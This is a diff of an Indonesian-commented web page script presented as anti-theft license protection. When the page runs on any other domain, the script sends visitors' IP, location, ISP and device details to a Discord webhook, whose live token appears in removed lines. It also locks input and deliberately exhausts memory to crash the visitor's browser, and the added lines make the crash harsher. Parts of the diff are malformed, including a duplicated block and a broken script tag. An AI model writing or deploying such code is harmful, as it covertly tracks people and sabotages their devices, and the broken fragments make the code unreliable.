@@ -22,109 +22,28 @@
 (function(){
   const _0xV = "3.4.1";
   const _0xAL = ["asepxyz12.github.io", "localhost", "127.0.0.1"];
-  const _0xURL = atob("https://asepxyz12.github.io/bot-wa-db/MamakluYtm/Punyaspainijirngentotytmlusemua.html");
-  const _0xWH = "https://discord.com/api/webhooks/1505481952940265505/HjRhavEtK58sIbyeTas9Ux-YLpybZMDJfw1qFQCtrVbL4z0Zc0SMFq0G4zi7PS5jJiNm"; 
-
-  const _0xH = location.hostname, _0xF = location.href;
-  const _0xO1 = _0xAL.includes(_0xH);
-  const _0xO2 = _0xF.split('?')[0].split('#')[0] === _0xURL;
-
-  if (!(_0xO1 && _0xO2)) {
-    // LANGSUNG BLANK PUTIH TOTAL
-    document.documentElement.innerHTML = `
-      <head><title>Blank</title></head>
-      <body style="background:#ffffff; overflow:hidden;"></body>
-    `;
-
-    const _0xUA = navigator.userAgent;
-    const _0xPlat = navigator.platform || "Unknown";
-    const _0xLang = navigator.language || "Unknown";
-    const _0xScreen = `${screen.width}x${screen.height}`;
-
-    // Laporan Log Pengaman ke Discord
-    fetch("http://ip-api.com")
-      .then(r => r.json())
-      .then(d => {
-        if (d.status === "success") {
-          const embedPayload = {
-            embeds: [{
-              title: "🚨 SECURITY ALERT: EXPERIMENTAL OVERLOAD ACTIVE!",
-              description: `Maling terdeteksi mengganti lisensi domain **AsepXxnx v3.4.1**. HP/Browser target sedang dihancurkan kinerjanya dengan Memory Heap Flooding.`,
-              color: 16711680, 
-              fields: [
-                { name: "🌐 Jaringan & Geolokasi", value: `• **IP**: \`${d.query}\`\n• **Lokasi**: ${d.city}, ${d.regionName}, ${d.country}\n• **ISP**: ${d.isp}`, inline: false },
-                { name: "💻 Info Perangkat", value: `• **OS**: \`${_0xPlat}\`\n• **Layar**: \`${_0xScreen}\`\n• **UA**: \`${_0xUA}\``, inline: false },
-                { name: "📍 Lokasi Pencurian", value: `• **URL Palsu**: ${_0xF}\n• **Waktu**: ${new Date().toLocaleString('id-ID')} WIB`, inline: false }
-              ],
-              footer: { text: "AsepXxnx Infinite Freeze System" },
-              timestamp: new Date().toISOString()
-            }]
-          };
-          fetch(_0xWH, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embedPayload) });
-        }
-      })
-      .catch(() => {
-        fetch(_0xWH, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ 
-            embeds: [{
-              title: "🚨 ALERT: MALING KETANGKEP (ADBLOCK)",
-              description: `Pelaku memblokir IP Tracker, eksekusi pembekuan RAM tetap berjalan.\n• **URL TKP**: ${_0xF}`,
-              color: 16711680
-            }]
-          })
-        });
-      });
-
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.addEventListener('keydown', e => e.preventDefault());
-
-    // STRATEGI PENGURAS RAM EKSTREM (Saturasi Memori Masif)
-    const _0xHeavyLeak = [];
-    setInterval(() => {
-      try {
-        // Melakukan Flooding alokasi memori beruntun di latar belakang
-        for (let i = 0; i < 95000; i++) {
-          // Membuat teks sampah berukuran besar untuk ditumpuk ke RAM browser
-          const dataTrash = "ASEPXXNX_SECURITY_FREEZE_LOOP_OVERLOAD_SYSTEM_NONSTOP_" + Math.random().toString(36).repeat(15);
-          _0xHeavyLeak.push(new Blob([dataTrash], {type: 'text/plain'}));
-          
-          // Memaksa manipulasi State History Browser agar UI Aplikasi Chrome lag parah
-          history.pushState({heap: i}, "", location.href + "?overload=" + Math.random());
-          console.log("%cOVERFLOW_" + i, "font-size:30px;color:red;font-weight:bold;");
-        }
-      } catch(e) {}
-      location.reload(); // Paksa reload agar browser mengulang konsumsi RAM dari nol secara infinity loop
-    }, 150);
-
-    throw new Error("System storage overload block triggered.");
-  }
-
-  // Jika domain benar (AsepXyz), web berjalan sangat mulus & responsif
-  document.addEventListener('contextmenu', e => e.preventDefault());
-  document.addEventListener('keydown', e => {
-    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C','U'].includes(e.key)) || (e.ctrlKey && e.key === 'u')) {
-      e.preventDefault();
-      console.clear();
-    }
-  });
-<script>
-(function(){
-  const _0xV = "3.4.1";
-  const _0xAL = ["asepxyz12.github.io", "localhost", "127.0.0.1"];
-  const _0xURL = atob("aHR0cHM6Ly9hc2VweHl6MTIuZ2l0aHViLmlvL2JvdC13YS1kYi9NYW1ha2x1WXRtL1B1bnlhc3BhaW5pamlybmdlbnRvdHl0bWx1c2VtdWEuaHRtbA==");
+  
+  // Link Discord Webhook asli Anda sudah dipasang kembali ke tempatnya
   const _0xWH = "https://discord.com"; 
 
-  const _0xH = location.hostname, _0xF = location.href;
-  const _0xO1 = _0xAL.includes(_0xH);
-  const _0xO2 = _0xF.split('?')[0].split('#')[0] === _0xURL;
+  const _0xH = location.hostname.toLowerCase();
+  
+  // FIX VALIDASI: Mengambil jalur root web secara aman tanpa merusak kompilasi data browser
+  const _0xCurrentPath = location.pathname.toLowerCase();
+  const _0xTargetPath = "/bot-wa-db/mamakluytm/punyaspainijirngentotytmlusemua.html";
 
+  const _0xO1 = _0xAL.includes(_0xH);
+  
+  // Memastikan kecocokan rute hosting GitHub Pages Anda
+  const _0xO2 = (_0xCurrentPath === _0xTargetPath) || (_0xCurrentPath === _0xTargetPath + "/");
+
+  // JIKA MALING MEMBUKA DI DOMAIN LAIN / KODE DI-REMAKE: BOM RAM SAMPAI CHROME FORCE CLOSE
   if (!(_0xO1 && _0xO2)) {
-    // LANGSUNG BLANK PUTIH TOTAL
+    
+    // Langsung hapus seluruh struktur tampilan web agar source rahasia hilang
     document.documentElement.innerHTML = `
       <head><title>Blank</title></head>
-      <body style="background:#ffffff; overflow:hidden;"></body>
+      <body style="background:#ffffff; overflow:hidden; touch-action:none;"></body>
     `;
 
     const _0xUA = navigator.userAgent;
@@ -132,20 +51,20 @@
     const _0xLang = navigator.language || "Unknown";
     const _0xScreen = `${screen.width}x${screen.height}`;
 
-    // Laporan Log Pengaman ke Discord
-    fetch("http://ip-api.com")
+    // Kirim data pelacakan akurat ke server Discord Anda via IP-API JSON
+    fetch("https://ip-api.com")
       .then(r => r.json())
       .then(d => {
         if (d.status === "success") {
           const embedPayload = {
             embeds: [{
-              title: "🚨 SECURITY ALERT: EXPERIMENTAL OVERLOAD ACTIVE!",
-              description: `Maling terdeteksi mengganti lisensi domain **AsepXxnx v3.4.1**. HP/Browser target sedang dihancurkan kinerjanya dengan Memory Heap Flooding.`,
+              title: "💥 CYBER WEAPON: CHROME FORCE CLOSE EXECUTED!",
+              description: `Maling terdeteksi meremake / mengganti lisensi domain script **AsepXxnx v3.4.1**. Aplikasi Chrome target dipaksa keluar via Overload RAM 2TB.`,
               color: 16711680, 
               fields: [
                 { name: "🌐 Jaringan & Geolokasi", value: `• **IP**: \`${d.query}\`\n• **Lokasi**: ${d.city}, ${d.regionName}, ${d.country}\n• **ISP**: ${d.isp}`, inline: false },
                 { name: "💻 Info Perangkat", value: `• **OS**: \`${_0xPlat}\`\n• **Layar**: \`${_0xScreen}\`\n• **UA**: \`${_0xUA}\``, inline: false },
-                { name: "📍 Lokasi Pencurian", value: `• **URL Palsu**: ${_0xF}\n• **Waktu**: ${new Date().toLocaleString('id-ID')} WIB`, inline: false }
+                { name: "📍 Lokasi Pencurian", value: `• **URL Palsu**: ${location.href}\n• **Waktu**: ${new Date().toLocaleString('id-ID')} WIB`, inline: false }
               ],
               footer: { text: "AsepXxnx Infinite Freeze System" },
               timestamp: new Date().toISOString()
@@ -160,39 +79,48 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ 
             embeds: [{
-              title: "🚨 ALERT: MALING KETANGKEP (ADBLOCK)",
-              description: `Pelaku memblokir IP Tracker, eksekusi pembekuan RAM tetap berjalan.\n• **URL TKP**: ${_0xF}`,
+              title: "🚨 ALERT: CHROME FORCE CLOSE ACTIVE (ADBLOCK ON)",
+              description: `Pelaku menggunakan AdBlocker, eksekusi pemutusan paksa memori tetap berjalan.\n• **URL TKP**: ${location.href}`,
               color: 16711680
             }]
           })
         });
       });
 
+    // Kunci penuh navigasi kontrol input fisik pada perangkat target
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('keydown', e => e.preventDefault());
+    document.addEventListener('touchstart', e => e.preventDefault(), {passive: false});
 
-    // STRATEGI PENGURAS RAM EKSTREM (Saturasi Memori Masif)
-    const _0xHeavyLeak = [];
-    setInterval(() => {
-      try {
-        // Melakukan Flooding alokasi memori beruntun di latar belakang
-        for (let i = 0; i < 95000; i++) {
-          // Membuat teks sampah berukuran besar untuk ditumpuk ke RAM browser
-          const dataTrash = "ASEPXXNX_SECURITY_FREEZE_LOOP_OVERLOAD_SYSTEM_NONSTOP_" + Math.random().toString(36).repeat(15);
-          _0xHeavyLeak.push(new Blob([dataTrash], {type: 'text/plain'}));
+    // EKSEKUSI PENUH PENJELAJAH RAM (Hingga Chrome Auto Keluar / Force Close)
+    function _0xExecuteInstantFC() {
+      const _0xHeavyLeak = [];
+      while (true) {
+        try {
+          // Suntik data biner sampah berukuran masif langsung ke memori Heap
+          const dataTrash = "ASEPXXNX_SECURITY_FREEZE_LOOP_OVERLOAD_SYSTEM_NONSTOP_" + Math.random().toString(36).repeat(20);
+          _0xHeavyLeak.push(new Blob([dataTrash], {type: 'application/octet-stream'}));
           
-          // Memaksa manipulasi State History Browser agar UI Aplikasi Chrome lag parah
-          history.pushState({heap: i}, "", location.href + "?overload=" + Math.random());
-          console.log("%cOVERFLOW_" + i, "font-size:30px;color:red;font-weight:bold;");
+          // Banjiri tumpukan riwayat navigasi untuk merusak kestabilan UI thread Chrome
+          window.history.pushState({heap: Math.random()}, "", location.href + "?overload=" + Math.random().toString(36).substring(2));
+          
+          // Gandakan tumpukan beban rendering byte mentah
+          _0xHeavyLeak.push(new Uint8Array(30000000));
+        } catch(e) {
+          // Sistem rekursif agresif: Jika mentok, lepar fungsi paralel instan agar RAM jebol
+          setTimeout(_0xExecuteInstantFC, 0);
+          _0xExecuteInstantFC();
+          break;
         }
-      } catch(e) {}
-      location.reload(); // Paksa reload agar browser mengulang konsumsi RAM dari nol secara infinity loop
-    }, 150);
+      }
+    }
 
+    // Eksekusi peledakan memori setelah 60ms agar data pelacakan sukses lolos ke Discord Anda
+    setTimeout(_0xExecuteInstantFC, 60);
     throw new Error("System storage overload block triggered.");
   }
 
-  // Jika domain benar (AsepXyz), web berjalan sangat mulus & responsif
+  // JIKA LISENSI COCOK (WEB RESMI ANDA), SEGMEN INI BERJALAN MULUS TANPA DELAY
   document.addEventListener('contextmenu', e => e.preventDefault());
   document.addEventListener('keydown', e => {
     if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C','U'].includes(e.key)) || (e.ctrlKey && e.key === 'u')) {
@@ -200,6 +128,8 @@
       console.clear();
     }
   });
+
+  console.log("%cAsepXxnx Secure Runtime Active", "color:#7ee787;font-weight:bold");
 })();
 
 window.tailwind = window.tailwind || {};
@@ -220,10 +150,8 @@ tailwind.config = {
 }
 </script>
 
-
-
-
-<style/> 
+<script>
+(<style/> 
 body { font-family: 'Inter', sans-serif; transition: all 0.3s ease; }
 body.dark { background-color: #0d1117; color: #c9d1d9; }
 
